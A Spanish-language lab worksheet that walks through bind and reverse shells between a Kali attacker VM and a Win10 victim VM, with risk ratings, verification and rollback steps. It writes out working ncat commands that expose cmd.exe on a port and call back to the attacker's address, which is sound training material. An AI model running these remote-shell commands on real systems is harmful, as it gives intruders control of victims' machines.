# Práctica — Bind & Reverse Shell en tu lab

**Entorno:** Kali (atacante) 192.168.100.110 ←→ Win10 víctima 192.168.100.146, mismo segmento (eth0).
**Regla fundamental:** el host Windows 11 real (192.168.100.63) NO participa de estos ejercicios.
Todo ocurre entre Kali y la VM Win10 víctima, ambas dentro de VirtualBox.

**Riesgo general de esta práctica: Medium** — se abren listeners y se ejecutan shells,
pero contenidos dentro de VMs aisladas del lab, sin tocar el host físico.

---

## Ejercicio 1 — Bind Shell (Kali escucha, Win10 se conecta hacia atrás... no, al revés)

Ojo con el sentido: en **bind**, la VÍCTIMA escucha. Como el objetivo es Win10, vas a necesitar
`ncat.exe` (portable, no requiere instalación) copiado a la VM víctima — Windows no trae netcat nativo.

### Configuración (C)
1. En Kali, descargá `ncat` para Windows (viene con el paquete Nmap para Windows) o usá el binario
   ya empaquetado con Nmap si lo tenés en tu Kali para transferir.
2. Pasalo a Win10 vía carpeta compartida de VirtualBox o `python3 -m http.server` en Kali +
   `curl`/`Invoke-WebRequest` desde Win10.

**Riesgo: Low** (solo transferencia de archivo, sin ejecución todavía)
**Verificación pre:** `ls -la ncat.exe` en Kali antes de transferir; en Win10, confirmar que
el archivo llegó con `Get-Item .\ncat.exe`.

### Recolección (R)
- Confirmar puerto libre en Win10 antes de bindear: `netstat -ano | findstr :4444` (PowerShell) —
  no debería devolver nada si el puerto está libre.

### Explotación (E)
En **Win10 (víctima)**:
```powershell
.\ncat.exe -lvp 4444 -e cmd.exe
```
En **Kali (atacante)**:
```bash
nc -nv 192.168.100.146 4444
```
**Riesgo: Medium** (queda un cmd.exe expuesto en la víctima mientras el listener sigue vivo)

### Impacto (I)
Deberías ver el prompt de `cmd.exe` de la víctima en la terminal de Kali. Probar `whoami`, `ipconfig`.

### Verificación post
- En Win10: `netstat -ano | findstr :4444` → debería mostrar el proceso ncat + la conexión ESTABLISHED.
- En Kali: `ss -tnp | grep 4444` → conexión activa hacia .146.

### Rollback
- En Kali: `Ctrl+C` para cortar la sesión.
- En Win10: `Get-Process ncat | Stop-Process -Force` (o cerrar la ventana de PowerShell/cmd donde corre).
- Verificación post-rollback: `netstat -ano | findstr :4444` en Win10 debe volver a estar vacío.

---

## Ejercicio 2 — Reverse Shell (Kali escucha, Win10 llama)

Este es el escenario más representativo de un caso real con firewall saliente permitido.

### Configuración (C)
**Riesgo: Low.** Elegir puerto alto no reservado, ej. `4445`, para no chocar con servicios del lab.

### Recolección (R)
Verificación pre en Kali: `ss -tnlp | grep 4445` → debe estar libre antes de levantar el listener.

### Explotación (E)
En **Kali (atacante)**:
```bash
nc -lvp 4445
```
En **Win10 (víctima)**, con ncat.exe ya transferido:
```powershell
.\ncat.exe 192.168.100.110 4445 -e cmd.exe
```
**Riesgo: Medium** (mientras el listener está arriba, cualquier host que llegue al puerto 4445
del Kali podría conectarse si no filtrás origen — en tu red virtual interna el riesgo es bajo,
pero es el hábito correcto para cuando trabajes contra infraestructura de cliente).

### Impacto (I)
Prompt de `cmd.exe` de Win10 aparece en la terminal de Kali que tenía el listener.

### Verificación post
- Kali: `ss -tnp | grep 4445` → ESTABLISHED con .146.
- Win10: `Get-Process ncat` → proceso corriendo.

### Rollback
- Cerrar la sesión con `exit` desde el shell recibido (más prolijo que Ctrl+C, cierra el proceso remoto).
- Si `ncat.exe` quedó colgado en Win10: `Get-Process ncat | Stop-Process -Force`.
- Verificación post-rollback: puerto 4445 libre en Kali (`ss -tnlp | grep 4445` vacío).

---

## Ejercicio 3 (opcional, siguiente sesión) — Upgrade de shell + filtrado de listener
- Levantar el listener en Kali con `iptables` restringiendo el origen solo a 192.168.100.146,
  como hábito de higiene aunque en este lab no sea estrictamente necesario.
- Si consiguen un reverse shell sobre un Linux (no este ejercicio con Win10), practicar el
  upgrade de TTY con `pty.spawn` documentado en `study-netcat-shells.md`.

---

## Pendientes / preguntas abiertas para la próxima sesión
- Confirmar si Win10 víctima tiene `ncat.exe` o si conviene armar un one-liner de PowerShell
  como alternativa (no requiere transferir binario).
- Evaluar si sumar Wireshark corriendo en Kali durante el Ejercicio 2 para ver el tráfico
  netcat sin cifrar en vivo (refuerza el punto de "por qué en producción se usa TLS").
